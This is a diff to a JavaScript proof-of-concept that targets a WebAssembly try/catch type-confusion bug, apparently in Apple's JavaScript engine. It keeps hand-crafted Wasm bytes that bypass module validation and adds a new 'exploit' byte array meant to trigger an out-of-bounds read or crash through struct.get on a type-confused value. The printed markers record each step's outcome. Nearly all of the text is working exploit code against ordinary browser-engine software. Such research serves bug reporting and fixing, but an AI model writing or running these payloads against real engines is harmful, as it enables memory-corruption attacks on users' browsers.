@@ -1,6 +1,14 @@
-print("=== Signal: 8f229fb729 ===");
+print("=== Signal: 8f229fb729 — Wasm try/catch type confusion ===");
 
-// STEP 1: Apple original bytes — validation bypass
+// CONTROL: valid module, struct.get on actual struct
+const bytes_control = new Uint8Array([
+  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+  0x01,0x04,0x01,0x60,0x00,0x00,
+  0x03,0x02,0x01,0x00,
+  0x0a,0x04,0x01,0x02,0x00,0x0b,
+]);
+
+// STEP1: Apple's original bytes — validation bypass
 const bytes_orig = new Uint8Array([
     0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
     0x01,0x8c,0x80,0x80,0x80,0x00,
@@ -13,41 +21,46 @@ const bytes_orig = new Uint8Array([
     0x41,0x01,0xfb,0x07,0x00,0x0b,0xfb,0x14,0x6a,0x0b,
 ]);
 
-try {
-    new WebAssembly.Module(bytes_orig);
-    print("STEP1_PASS: validation bypass confirmed");
-} catch(e) { print("STEP1_FIXED: " + e); }
-
-// STEP 2: Refined — throw triggers catch → type confusion executes
-const bytes_refined = new Uint8Array([
-    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
-    0x01,0x0c,0x03,0x5e,0x7e,0x01,0x60,0x00,
-    0x00,0x60,0x01,0x6f,0x01,0x7f,0x03,0x02,
-    0x01,0x02,0x0d,0x03,0x01,0x00,0x01,0x07,
-    0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,
-    0x00,0x0a,0x15,0x01,0x13,0x00,0x06,0x6e,
-    0x20,0x00,0x08,0x00,0x07,0x00,0x41,0x01,
-    0xfb,0x07,0x00,0x0b,0xfb,0x14,0x6a,0x0b,
+// STEP2: struct.get on type-confused value → OOB read / crash
+const bytes_exploit = new Uint8Array([
+    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+    0x01, 0x0d, 0x03, 0x5f, 0x01, 0x7e, 0x01, 0x60,
+    0x00, 0x00, 0x60, 0x01, 0x6f, 0x01, 0x7e, 0x03,
+    0x02, 0x01, 0x02, 0x0d, 0x03, 0x01, 0x00, 0x01,
+    0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e,
+    0x00, 0x00, 0x0a, 0x17, 0x01, 0x15, 0x00, 0x06,
+    0x6e, 0x20, 0x00, 0x08, 0x00, 0x07, 0x00, 0xfb,
+    0x07, 0x00, 0x0b, 0xfb, 0x15, 0x00, 0xfb, 0x02,
+    0x00, 0x00, 0x0b,
 ]);
 
-print("");
-const storage = new ArrayBuffer(8);
-const view2 = new DataView(storage);
-view2.setBigUint64(0, 0x4141414141414141n - (1n << 49n), true);
-const nonCellExternref = view2.getFloat64(0, true);
-print("=== STEP 2: catch path trigger ===");
+// CONTROL
 try {
-    const mod2 = new WebAssembly.Module(bytes_refined);
-    print("STEP2_MODULE: compiled");
-    const inst2 = new WebAssembly.Instance(mod2);
+    new WebAssembly.Module(bytes_control);
+    print("CONTROL_PASS: valid module compiled");
+} catch(e) { print("CONTROL_FAIL: " + e); }
+
+// STEP1
+try {
+    new WebAssembly.Module(bytes_orig);
+    print("STEP1_PASS: validation bypass confirmed (spec violation)");
+} catch(e) { print("STEP1_FIXED: " + e); }
+
+// STEP2: struct.get on type-confused null → crash
+print("STEP2: struct.get on type-confused value...");
+try {
+    const mod = new WebAssembly.Module(bytes_exploit);
+    print("STEP2_MODULE: compiled (bypass + struct access)");
+    const inst = new WebAssembly.Instance(mod);
     print("STEP2_INSTANCE: ok");
     for (let i = 0; i < 10000; ++i) {
         try {
-            const r = inst2.exports.main(nonCellExternref);
-            if (i === 0) print("STEP2_RESULT_0: " + r);
+            const r = inst.exports.main(null);
+            if (i === 0) print("STEP2_RESULT_0: " + r + " (struct.get on null = OOB read!)");
         } catch(inner) {
-            if (i === 0) print("STEP2_INNER: " + inner);
+            if (i === 0) print("STEP2_RUNTIME_EXCEPTION: " + inner);
+            break;
         }
     }
-    print("STEP2_DONE: 10000 catch-path iterations");
-} catch(e) { print("STEP2_ERROR: " + e); }
+    print("STEP2_DONE");
+} catch(e) { print("STEP2_COMPILE_ERROR: " + e); }
